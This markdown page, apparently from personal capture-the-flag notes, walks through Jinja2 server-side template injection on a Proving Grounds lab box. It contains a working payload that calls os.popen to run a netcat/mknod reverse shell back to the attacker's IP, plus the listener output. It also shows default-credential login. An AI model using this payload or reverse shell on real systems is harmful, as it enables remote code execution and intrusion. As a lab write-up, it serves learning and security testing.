---
layout: default
title: SSTI
parent: Web Exploits
nav_order: 7
---

# Server Side Template Injection (SSTI)

---

## Jinja2 Template Injection

Attempt to use Netcat to authenticate on port 31337 with the default creds \*guest:guest"

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ nc -nv 192.168.158.102 31337
(UNKNOWN) [192.168.158.102] 31337 (?) open
username> guest
password> guest

Welcome to our own ticketing system. This application is still under
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit

>
```

We have the ability to open tickets

![test](../../../../assets/images/ctfs/proving_grounds/djinn3/test.png)

Since this is a Flask Python server it is likely using Jinja to render the HTML.

Let's test for Jinja SSTI (Server Side Template Injection)

![test2](../../../../assets/images/ctfs/proving_grounds/djinn3/test2.png)

![seven](../../../../assets/images/ctfs/proving_grounds/djinn3/seven.png)

Next let's test if we get Jinja specific SSTI by trying to display the _id_ command

![test3](../../../../assets/images/ctfs/proving_grounds/djinn3/test3.png)

![ssti](../../../../assets/images/ctfs/proving_grounds/djinn3/ssti.png)

Our SSTI test worked so we can proceed with attempting to exploit.

Use Revshellgen to generate a _nc-mknod_ reverseh shell one-liner

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/djinn3]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l').read()}}

Send the payload to the target using the open ticket Jinja2 SSTI exploit

![test4](../../../../assets/images/ctfs/proving_grounds/djinn3/test4.png)

Click the link of the created ticket and we get a reverse shell.

![link2](../../../../assets/images/ctfs/proving_grounds/djinn3/link2.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.158.102] 45698
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
